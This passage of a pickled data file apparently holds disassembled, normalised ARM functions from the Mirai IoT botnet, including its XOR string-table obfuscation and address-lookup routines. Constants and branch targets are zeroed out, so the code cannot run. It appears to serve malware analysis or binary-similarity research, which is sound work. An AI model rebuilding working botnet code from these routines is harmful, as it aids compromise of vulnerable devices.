nMOV~R0,R10\nLDR~R1,[R4,0]\nLDR~R3,[SP,0]\nSUB~R3,R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nSTRB~R3,[R4,0]\nCMP~R3,0\nBNE~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R10\nLDR~R1,[R4,0]\nLDR~R3,[SP,0]\nSUB~R3,R3,0\nBL~FOO\nMOV~R7,R0\nMOV~R0,0\nBL~FOO\nCMN~R7,0\nBNE~FOO\nB~FOO\nMOV~R2,0\nSTRB~R2,[R4,0]\nMOV~R3,0\nSTR~R3,[R4,0]\nMOV~R7,0\nB~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R7,0\nB~FOO\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nORR~R2,R2,R3,LSL0\nLDR~R8,[R4]\nLDR~R3,[R4,0]\nSTR~R3,[SP,0]\nSTRB~R2,[SP,0]\nMOV~R2,R2,ASR0\nSTRB~R2,[SP,0]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R5,R3\nORRGT~R5,R3,0\nCMP~R5,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,R5\nBL~FOO\nMOV~R6,R0\nCMN~R0,0\nMOVEQ~R0,R5\nBLEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nBL~FOO\nSUBS~R5,R0,0\nBEQ~FOO\nMOV~R7,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R7,[SP,0]\nLDR~R4,[R5,0]\nBL~FOO\nLDRB~R1,[R5]\nBL~FOO\nLDR~R3,[R4,R0,LSL0]\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,R7\nBL~FOO\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nMOV~R0,R5\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nADD~R2,SP,0\nADD~R2,R2,0\nLDR~R3,[SP,0]\nADD~R1,R2,R3\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R7\nBL~FOO\nMOV~R1,0\nSTRB~R1,[SP,0]\nMOV~R0,R6\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,R8,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,[R8]\nLDRB~R2,[R8,0]\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nADD~R1,R8,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,[R8,0]\nLDRB~R2,[R8,0]\nMOV~R3,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nMOV~R2,0\nSTR~R2,[R4,0]\nB~FOO\nMOV~R7,0\nCMP~R7,0\nBEQ~FOO\nLDR~R2,[R4,0]\nCMP~R7,R2\nMOVLT~R1,R7\nMOVGE~R1,R2\nRSB~R2,R1,R2\nSTR~R2,[R4,0]\nMOV~R0,R10\nADD~R1,R10,R1\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R4,0\nBLE~FOO\nB~FOO\nMOV~R2,0\nB~FOO\nCMP~R7,0\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p308
L6264L
tp309
a(S'table_retrieve_val'
p310
S'"MOV~R0,R0,LSL0\nLDR~R3,<STR>\nADD~R0,R0,R3\nCMP~R1,0\nLDRNEB~R3,[R0,0]\nLDRNEB~R2,[R0,0]\nORRNE~R3,R3,R2,LSL0\nSTRNE~R3,[R1]\nLDR~R0,[R0]\nRET"'
p311
L40L
tp312
a(S'toggle_obf'
p313
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R0,R0,LSL0\nBIC~R0,R0,0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nLDR~R3,<STR>\nADD~R0,R0,R3\nLDR~R3,<STR>\nLDR~R2,[R3]\nAND~R6,R2,0\nMOV~R3,R2,LSR0\nAND~R5,R3,0\nMOV~R3,R2,LSR0\nAND~R4,R3,0\nMOV~LR,R2,LSR0\nLDRB~R2,[R0,0]\nLDRB~R3,[R0,0]\nORRS~R3,R2,R3,LSL0\nLDMEQFD~SP!,{R4-R6,PC}\nMOV~R1,0\nADD~R12,R0,0\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,R6,R3\nSTRB~R3,[R1,R2]\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,R5,R3\nSTRB~R3,[R1,R2]\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,R4,R3\nSTRB~R3,[R1,R2]\nLDR~R2,[R0]\nLDRB~R3,[R1,R2]\nEOR~R3,LR,R3\nSTRB~R3,[R1,R2]\nADD~R1,R1,0\nLDRB~R3,[R0,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R1\nBGT~FOO\nLDMFD~SP!,{R4-R6,PC}"'
p314
L176L
tp315
a(S'table_lock_val'
p316
S'"STR~LR,[SP,-0]\nAND~R0,R0,0\nBL~FOO\nLDR~PC,[SP]"'
p317
L16L
tp318
a(S'table_unlock_val'
p319
S'"STR~LR,[SP,-0]\nAND~R0,R0,0\nBL~FOO\nLDR~PC,[SP]"'
p320
L16L
tp321
a(S'add_entry'
p322
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R7,R1\nMOV~R5,R2\nAND~R4,R0,0\nMOV~R0,R2\nBL~FOO\nMOV~R6,R0\nMOV~R1,R7\nMOV~R2,R5\nBL~FOO\nLDR~R3,<STR>\nSTR~R6,[R3,R4,LSL0]\nMOV~R4,R4,LSL0\nADD~R4,R4,R3\nSTRB~R5,[R4,0]\nMOV~R5,R5,ASR0\nSTRB~R5,[R4,0]\nLDMFD~SP!,{R4-R7,PC}"'
p323
L72L
tp324
a(S'table_init'
p325
S'"STR~LR,[SP,-0]\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~PC,[SP]"'
p326
L808L
tp327
a(S'util_strlen'
p328
S'"MOV~R2,R0\nLDRB~R0,[R0]\nCMP~R0,0\nMOVEQ~PC,LR\nMOV~R0,0\nADD~R0,R0,0\nLDRB~R3,[R0,R2]\nCMP~R3,0\nBNE~FOO\nRET"'
p329
L40L
tp330
a(S'util_strncmp'
p331
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R7,R0\nMOV~R6,R1\nMOV~R5,R2\nBL~FOO\nMOV~R4,R0\nMOV~R0,R6\nBL~FOO\nCMP~R0,R5\nCMPGE~R4,R5\nBGE~FOO\nB~FOO\nLDRB~R2,[R7]\nLDRB~R3,[R6]\nCMP~R2,R3\nBNE~FOO\nADD~R7,R7,0\nADD~R6,R6,0\nSUB~R5,R5,0\nCMN~R5,0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4-R7,PC}\nMOV~R0,0\nLDMFD~SP!,{R4-R7,PC}"'
p332
L100L
tp333
a(S'util_strcmp'
p334
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R6,R0\nMOV~R5,R1\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nCMP~R4,R0\nBNE~FOO\nB~FOO\nLDRB~R2,[R6]\nLDRB~R3,[R5]\nCMP~R2,R3\nBNE~FOO\nADD~R6,R6,0\nADD~R5,R5,0\nSUB~R4,R4,0\nCMN~R4,0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4-R6,PC}\nMOV~R0,0\nLDMFD~SP!,{R4-R6,PC}"'
p335
L92L
tp336
a(S'util_memcpy'
p337
S'"CMP~R2,0\nMOVEQ~PC,LR\nMOV~R12,0\nLDRB~R3,[R12,R1]\nSTRB~R3,[R12,R0]\nADD~R12,R12,0\nCMP~R12,R2\nBNE~FOO\nRET"'
p338
L36L
tp339
a(S'util_strcpy'
p340
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R4,R0\nMOV~R5,R1\nMOV~R0,R1\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nADD~R2,R6,0\nBL~FOO\nMOV~R0,R6\nLDMFD~SP!,{R4-R6,PC}"'
p341
L48L
tp342
a(S'util_zero'
p343
S'"CMP~R1,0\nMOVEQ~PC,LR\nMOV~R3,0\nMOV~R2,R3\nSTRB~R2,[R3,R0]\nADD~R3,R3,0\nCMP~R3,R1\nBNE~FOO\nRET"'
p344
L36L
tp345
a(S'util_itoa'
p346
S'"STMFD~SP!,{R4-R8,LR}\nSUB~SP,SP,0\nSUBS~R7,R2,0\nBEQ~FOO\nCMP~R0,0\nMOVEQ~R3,0\nSTREQB~R3,[R7]\nSUBEQ~R3,R3,0\nSTREQB~R3,[R7,0]\nBEQ~FOO\nMOV~R3,0\nSTRB~R3,[SP,0]\nMOV~R3,R0,LSR0\nCMP~R1,0\nMOVNE~R3,0\nANDEQ~R3,R3,0\nCMP~R3,0\nMOVEQ~R4,R0\nMOVEQ~R8,0\nBEQ~FOO\nRSB~R4,R0,0\nCMP~R4,0\nMOVNE~R8,0\nBEQ~FOO\nMOV~R5,0\nMOV~R6,R1\nMOV~R0,R4\nMOV~R1,R6\nBL~FOO\nCMP~R0,0\nADDLE~R0,R0,0\nADDGT~R0,R0,0\nADD~R2,SP,0\nADD~R3,R2,R5\nSTRB~R0,[R3,-0]\nMOV~R0,R4\nMOV~R1,R6\nBL~FOO\nSUB~R5,R5,0\nSUBS~R4,R0,0\nBNE~FOO\nCMP~R8,0\nADDEQ~R5,R5,0\nBEQ~FOO\nADD~R3,SP,0\nADD~R2,R3,R5\nMOV~R3,0\nSTRB~R3,[R2,-0]\nMOV~R0,R7\nADD~R1,SP,0\nADD~R1,R1,R5\nBL~FOO\nB~FOO\nMOV~R5,0\nB~FOO\nMOV~R0,R7\nADD~SP,SP,0\nLDMFD~SP!,{R4-R8,PC}"'
p347
L232L
tp348
a(S'util_memsearch'
p349
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R5,R0\nMOV~R4,R2\nMOV~LR,R3\nCMP~R3,R1\nBGT~FOO\nCMP~R1,0\nBLE~FOO\nMOV~R0,0\nMOV~R12,R0\nLDRB~R2,[R0,R5]\nLDRB~R3,[R12,R4]\nCMP~R2,R3\nMOVNE~R12,0\nBNE~FOO\nADD~R12,R12,0\nCMP~LR,R12\nBNE~FOO\nADD~R0,R0,0\nLDMFD~SP!,{R4,R5,PC}\nADD~R0,R0,0\nCMP~R1,R0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,R5,PC}"'
p350
L100L
tp351
a(S'util_stristr'
p352
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R6,R0\nMOV~R4,R1\nMOV~R5,R2\nMOV~R0,R2\nBL~FOO\nMOV~LR,R0\nMOV~R0,R6\nMOV~R12,0\nB~FOO\nLDRB~R1,[R0]\nLDRB~R2,[R5,R12]\nSUB~R3,R1,0\nCMP~R3,0\nORRLS~R1,R1,0\nSUB~R3,R2,0\nCMP~R3,0\nORRLS~R2,R2,0\nCMP~R1,R2\nMOVNE~R12,0\nBNE~FOO\nADD~R12,R12,0\nCMP~LR,R12\nBNE~FOO\nRSB~R0,R6,R0\nLDMFD~SP!,{R4-R6,PC}\nSUB~R4,R4,0\nCMP~R4,0\nBGT~FOO\nMOV~R0,0\nLDMFD~SP!,{R4-R6,PC}"'
p353
L124L
tp354
a(S'util_atoi'
p355
S'"STMFD~SP!,{R4-R10,LR}\nMOV~R4,R0\nMOV~R8,R1\nLDRB~R2,[R4]\nMOV~R5,R2\nAND~R3,R2,0\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nB~FOO\nLDRB~R5,[R3]\nMOV~R4,R3\nMOV~R7,0\nMOV~R9,0\nB~FOO\nCMP~R2,0\nLDREQB~R5,[R3]\nMOVEQ~R4,R3\nMOV~R7,0\nMOV~R9,0\nMOV~R6,R8\nMOV~R0,R7\nMOV~R1,R8\nBL~FOO\nMOV~R10,R0\nMOV~R0,R7\nMOV~R1,R8\nBL~FOO\nMOV~LR,R0\nMOV~R0,0\nMOV~R12,R0\nAND~R2,R5,0\nSUB~R3,R2,0\nCMP~R3,0\nSUBLS~R2,R5,0\nBLS~FOO\nSUB~R3,R2,0\nSUB~R2,R2,0\nCMP~R3,0\nMOVHI~R1,0\nMOVLS~R1,0\nCMP~R3,0\nCMPHI~R2,0\nBHI~FOO\nCMP~R1,0\nMOVEQ~R3,0\nMOVNE~R3,0\nRSB~R2,R3,R5\nCMP~R2,R8\nBGE~FOO\nCMP~R0,LR\nMOVLS~R3,0\nMOVHI~R3,0\nORRS~R12,R3,R12,LSR0\nBNE~FOO\nCMP~R0,LR\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R2,R10\nMOVLE~R3,0\nCMP~R3,0\nMLAEQ~R0,R6,R0,R2\nMOVEQ~R12,0\nBEQ~FOO\nMOV~R12,0\nLDRB~R5,[R4]\nB~FOO\nCMP~R12,0\nBGE~FOO\nCMP~R9,0\nMOVEQ~R0,0\nMOVNE~R0,0\nLDMFD~SP!,{R4-R10,PC}\nCMP~R9,0\nRSBNE~R0,R0,0\nLDMFD~SP!,{R4-R10,PC}\nMOV~R3,R4\nCMP~R2,0\nBNE~FOO\nB~FOO"'
p356
L328L
tp357
a(S'util_fdgets'
p358
S'"STMFD~SP!,{R4-R8,R10,LR}\nMOV~R10,R0\nMOV~R8,R1\nMOV~R7,R2\nMOV~R4,R0\nMOV~R5,0\nMOV~R6,R4\nMOV~R0,R7\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R5,R5,0\nCMP~R8,R5\nBLE~FOO\nADD~R4,R4,0\nLDRB~R3,[R6]\nCMP~R3,0\nBNE~FOO\nCMP~R5,0\nMOVNE~R0,R10\nMOVEQ~R0,0\nLDMFD~SP!,{R4-R8,R10,PC}"'
p359
L96L
tp360
a(S'util_local_addr'
p361
S'"STMFD~SP!,{R4,R5,LR}\nSUB~SP,SP,0\nMOV~R3,0\nSTR~R3,[SP]\nBL~FOO\nMOV~R4,0\nSTR~R4,[R0]\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,R4\nBL~FOO\nMOV~R5,R0\nCMN~R0,0\nMOVEQ~R0,R4\nBEQ~FOO\nMOV~R2,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R2,[SP,0]\nMOV~R3,0\nORR~R3,R3,R3,LSL0\nSTR~R3,[SP,0]\nSTRB~R2,[SP,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nADD~R4,SP,0\nMOV~R0,R5\nMOV~R1,R4\nADD~R2,R2,0\nBL~FOO\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,SP\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R0,[SP,0]\nADD~SP,SP,0\nLDMFD~SP!,{R4,R5,PC}"'
p362
L160L
tp363
a(S'__udivsi3'
p364
S'"SUBS~R2,R1,0\nMOVEQ~PC,LR\nBCC~FOO\nCMP~R0,R1\nBLS~FOO\nTST~R1,R2\nBEQ~FOO\nTST~R1,0\nMOVEQ~R1,R1,LSL0\nMOVEQ~R3,0\nMOVNE~R3,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nMOVCC~R3,R3,LSL0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nMOVCC~R3,R3,LSL0\nBCC~FOO\nMOV~R2,0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nORRCS~R2,R2,R3\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nORRCS~R2,R2,R3,LSR0\nCMP~R0,0\nMOVNES~R3,R3,LSR0\nMOVNE~R1,R1,LSR0\nBNE~FOO\nMOV~R0,R2\nRET\nMOVEQ~R0,0\nMOVNE~R0,0\nRET\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nMOVCS~R2,0\nMOVCC~R2,0\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nADDCS~R2,R2,0\nCMP~R1,0\nMOVCS~R1,R1,LSR0\nADDCS~R2,R2,0\nCMP~R1,0\nADDHI~R2,R2,0\nADDLS~R2,R2,R1,LSR0\nMOV~R0,R0,LSRR2\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p365
L248L
tp366
a(S'__aeabi_uidivmod'
p367
S'"STMFD~SP!,{R0,R1,LR}\nBL~FOO\nLDMFD~SP!,{R1,R2,LR}\nMUL~R3,R2,R0\nSUB~R1,R1,R3\nRET"'
p368
L24L
tp369
a(S'__umodsi3'
p370
S'"SUBS~R2,R1,0\nBCC~FOO\nCMPNE~R0,R1\nMOVEQ~R0,0\nTSTHI~R1,R2\nANDEQ~R0,R0,R2\nMOVLS~PC,LR\nMOV~R2,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nSUBS~R2,R2,0\nBLT~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,0\nMOV~R1,R1,LSR0\nSUBGES~R2,R2,0\nBGE~FOO\nTST~R2,0\nTEQNE~R0,0\nBEQ~FOO\nCMN~R2,0\nBLT~FOO\nBEQ~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p371
L204L
tp372
a(S'__modsi3'
p373
S'"CMP~R1,0\nBEQ~FOO\nRSBMI~R1,R1,0\nMOVS~R12,R0\nRSBMI~R0,R0,0\nSUBS~R2,R1,0\nCMPNE~R0,R1\nMOVEQ~R0,0\nTSTHI~R1,R2\nANDEQ~R0,R0,R2\nBLS~FOO\nMOV~R2,0\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nCMP~R1,0\nCMPCC~R1,R0\nMOVCC~R1,R1,LSL0\nADDCC~R2,R2,0\nBCC~FOO\nSUBS~R2,R2,0\nBLT~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,R1,LSR0\nSUBCS~R0,R0,R1,LSR0\nCMP~R0,0\nMOV~R1,R1,LSR0\nSUBGES~R2,R2,0\nBGE~FOO\nTST~R2,0\nTEQNE~R0,0\nBEQ~FOO\nCMN~R2,0\nBLT~FOO\nBEQ~FOO\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nMOV~R1,R1,LSR0\nCMP~R0,R1\nSUBCS~R0,R0,R1\nCMP~R12,0\nRSBMI~R0,R0,0\nRET\nSTR~LR,[SP,-0]\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p374
L228L
tp375
a(S'__do_global_ctors_aux'
p376
S'"LDR~R3,<STR>\nLDR~R2,[R3,-0]\nCMN~R2,0\nSTMFD~SP!,{R4,LR}\nSUB~R4,R3,0\nLDMEQFD~SP!,{R4,PC}\nMOV~LR,PC\nMOV~PC,R2\nLDR~R2,[R4,-0]\nCMN~R2,0\nBNE~FOO\nLDMFD~SP!,{R4,PC}"'
p377
L48L
tp378
a(S'call___do_global_ctors_aux'
p379
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p380
L8L
tp381
a(S'.term_proc'
p382
S'"MOV~R12,SP\nSTMFD~SP!,{R4-R12,LR,PC}\nSUB~R11,R12,0\nBL~FOO\nLDMDB~R11,{R4-R11,SP,PC}"'
p383
L20L
tp384
a.